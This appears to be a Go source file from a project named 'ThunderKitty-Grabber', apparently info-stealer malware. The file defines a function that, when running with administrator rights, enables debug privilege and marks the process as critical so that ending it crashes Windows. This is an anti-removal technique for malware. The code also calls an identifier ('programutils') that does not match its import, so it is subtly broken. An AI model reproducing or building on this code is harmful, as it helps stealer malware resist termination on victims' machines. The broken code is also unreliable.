package CriticalProcess

import (
	Common "ThunderKitty-Grabber/utils/common"
	"github.com/EvilBytecode/GoDefender/Process/CriticalProcess"
)

func Set() {
	if Common.IsElevated() {
		programutils.SetDebugPrivilege()
		programutils.SetProcessCritical()
	}
}
